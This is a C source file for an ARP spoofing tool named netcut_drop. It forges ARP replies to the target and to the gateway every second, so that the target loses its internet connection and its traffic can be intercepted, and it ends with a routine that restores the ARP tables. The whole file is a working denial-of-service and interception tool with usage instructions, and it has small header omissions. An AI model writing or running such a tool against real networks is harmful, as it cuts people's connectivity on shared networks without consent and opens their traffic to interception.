// netcut_drop.c - ARP Spoofing to cut internet (Simplified)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <time.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/ioctl.h>

// Define Ethernet and ARP structures manually to avoid header issues
#define ETH_ALEN 6
#define ETH_HLEN 14
#define ARPHRD_ETHER 1
#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP 0x0806
#define ARPOP_REQUEST 1
#define ARPOP_REPLY 2

struct ether_header {
    uint8_t ether_dhost[ETH_ALEN];
    uint8_t ether_shost[ETH_ALEN];
    uint16_t ether_type;
} __attribute__((packed));

struct ether_arp {
    uint16_t ar_hrd;
    uint16_t ar_pro;
    uint8_t ar_hln;
    uint8_t ar_pln;
    uint16_t ar_op;
    uint8_t ar_sha[ETH_ALEN];
    uint8_t ar_spa[4];
    uint8_t ar_tha[ETH_ALEN];
    uint8_t ar_tpa[4];
} __attribute__((packed));

static volatile sig_atomic_t running = 1;

void signal_handler(int sig) {
    (void)sig;
    fprintf(stderr, "\n[*] Shutting down...\n");
    running = 0;
}

void get_mac(const char *iface, unsigned char *mac) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';
    
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFHWADDR");
        close(sock);
        return;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
}

void format_mac(const unsigned char *mac, char *buffer, size_t buflen) {
    snprintf(buffer, buflen, "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void send_arp(int sock, const char *iface, unsigned char *src_mac, unsigned char *dst_mac,
              uint32_t src_ip, uint32_t dst_ip, int op) {
    struct sockaddr_ll addr;
    uint8_t packet[42];
    struct ether_header *eth = (struct ether_header *)packet;
    struct ether_arp *arp = (struct ether_arp *)(packet + sizeof(struct ether_header));
    
    // Zero out packet
    memset(packet, 0, sizeof(packet));
    
    // Ethernet header
    memcpy(eth->ether_dhost, dst_mac, ETH_ALEN);
    memcpy(eth->ether_shost, src_mac, ETH_ALEN);
    eth->ether_type = htons(ETHERTYPE_ARP);
    
    // ARP header
    arp->ar_hrd = htons(ARPHRD_ETHER);
    arp->ar_pro = htons(ETHERTYPE_IP);
    arp->ar_hln = ETH_ALEN;
    arp->ar_pln = 4;
    arp->ar_op = htons(op);
    memcpy(arp->ar_sha, src_mac, ETH_ALEN);
    memcpy(arp->ar_spa, &src_ip, 4);
    memcpy(arp->ar_tha, dst_mac, ETH_ALEN);
    memcpy(arp->ar_tpa, &dst_ip, 4);
    
    int ifindex = if_nametoindex(iface);
    if (ifindex == 0) {
        fprintf(stderr, "Failed to get interface index for %s\n", iface);
        return;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = ifindex;
    addr.sll_halen = ETH_ALEN;
    memcpy(addr.sll_addr, dst_mac, ETH_ALEN);
    
    if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("sendto");
    }
}

// Resolve MAC via ARP request
int resolve_mac(int sock, const char *iface, uint32_t ip, unsigned char *mac) {
    unsigned char broadcast[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    unsigned char src_mac[ETH_ALEN];
    struct sockaddr_ll addr;
    uint8_t packet[42];
    struct ether_header *eth = (struct ether_header *)packet;
    struct ether_arp *arp = (struct ether_arp *)(packet + sizeof(struct ether_header));
    fd_set fds;
    struct timeval tv;
    int ifindex = if_nametoindex(iface);
    
    get_mac(iface, src_mac);
    
    // Build ARP request
    memset(packet, 0, sizeof(packet));
    memcpy(eth->ether_dhost, broadcast, ETH_ALEN);
    memcpy(eth->ether_shost, src_mac, ETH_ALEN);
    eth->ether_type = htons(ETHERTYPE_ARP);
    
    arp->ar_hrd = htons(ARPHRD_ETHER);
    arp->ar_pro = htons(ETHERTYPE_IP);
    arp->ar_hln = ETH_ALEN;
    arp->ar_pln = 4;
    arp->ar_op = htons(ARPOP_REQUEST);
    memcpy(arp->ar_sha, src_mac, ETH_ALEN);
    memcpy(arp->ar_spa, &ip, 4);
    memset(arp->ar_tha, 0, ETH_ALEN);
    memset(arp->ar_tpa, 0, 4);
    
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = ifindex;
    addr.sll_halen = ETH_ALEN;
    memcpy(addr.sll_addr, broadcast, ETH_ALEN);
    
    // Send ARP request
    if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        return -1;
    }
    
    // Wait for ARP reply
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        struct sockaddr_ll from;
        socklen_t fromlen = sizeof(from);
        uint8_t buf[1024];
        ssize_t n = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&from, &fromlen);
        
        if (n > 0) {
            struct ether_header *resp_eth = (struct ether_header *)buf;
            if (resp_eth->ether_type == htons(ETHERTYPE_ARP)) {
                struct ether_arp *resp_arp = (struct ether_arp *)(buf + sizeof(struct ether_header));
                if (resp_arp->ar_op == htons(ARPOP_REPLY)) {
                    uint32_t sender_ip;
                    memcpy(&sender_ip, resp_arp->ar_spa, 4);
                    if (sender_ip == ip) {
                        memcpy(mac, resp_arp->ar_sha, ETH_ALEN);
                        return 0;
                    }
                }
            }
        }
    }
    
    // If no reply, use broadcast
    memcpy(mac, broadcast, ETH_ALEN);
    return -1;
}

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <iface> <target_ip> <gateway_ip>\n", argv[0]);
        fprintf(stderr, "Example: %s eth0 192.168.1.100 192.168.1.1\n", argv[0]);
        return 1;
    }
    
    const char *iface = argv[1];
    uint32_t target_ip, gateway_ip;
    unsigned char src_mac[ETH_ALEN], target_mac[ETH_ALEN], gateway_mac[ETH_ALEN];
    char mac_str[18];
    int sock;
    struct sigaction sa;
    int count = 0;
    
    // Parse IPs
    if (inet_pton(AF_INET, argv[2], &target_ip) != 1) {
        fprintf(stderr, "Invalid target IP: %s\n", argv[2]);
        return 1;
    }
    if (inet_pton(AF_INET, argv[3], &gateway_ip) != 1) {
        fprintf(stderr, "Invalid gateway IP: %s\n", argv[3]);
        return 1;
    }
    
    // Setup signal handler
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = signal_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
    
    // Create raw socket
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket(AF_PACKET)");
        return 1;
    }
    
    // Get our MAC
    get_mac(iface, src_mac);
    format_mac(src_mac, mac_str, sizeof(mac_str));
    printf("[*] Our MAC: %s\n", mac_str);
    printf("[*] Interface: %s\n", iface);
    
    // Resolve target and gateway MACs
    printf("[*] Resolving MAC addresses...\n");
    if (resolve_mac(sock, iface, target_ip, target_mac) == 0) {
        format_mac(target_mac, mac_str, sizeof(mac_str));
        printf("[*] Target MAC: %s\n", mac_str);
    } else {
        printf("[!] Could not resolve target MAC, using broadcast\n");
        memset(target_mac, 0xff, ETH_ALEN);
    }
    
    if (resolve_mac(sock, iface, gateway_ip, gateway_mac) == 0) {
        format_mac(gateway_mac, mac_str, sizeof(mac_str));
        printf("[*] Gateway MAC: %s\n", mac_str);
    } else {
        printf("[!] Could not resolve gateway MAC, using broadcast\n");
        memset(gateway_mac, 0xff, ETH_ALEN);
    }
    
    printf("\n[*] Starting ARP spoofing...\n");
    printf("[*] Target: %s, Gateway: %s\n", argv[2], argv[3]);
    printf("[*] Press Ctrl+C to stop\n\n");
    
    // ARP spoofing loop
    while (running) {
        // Tell target: "I am the gateway"
        send_arp(sock, iface, src_mac, target_mac, gateway_ip, target_ip, ARPOP_REPLY);
        
        // Tell gateway: "I am the target"
        send_arp(sock, iface, src_mac, gateway_mac, target_ip, gateway_ip, ARPOP_REPLY);
        
        count++;
        if (count % 10 == 0) {
            printf("[*] Sent %d ARP spoofing packets\r", count * 2);
            fflush(stdout);
        }
        
        sleep(1);
    }
    
    // Restore ARP tables
    printf("\n[*] Restoring ARP tables...\n");
    
    // Send correct ARP replies to restore
    send_arp(sock, iface, gateway_mac, target_mac, gateway_ip, target_ip, ARPOP_REPLY);
    send_arp(sock, iface, target_mac, gateway_mac, target_ip, gateway_ip, ARPOP_REPLY);
    
    close(sock);
    printf("[+] Done.\n");
    return 0;
}
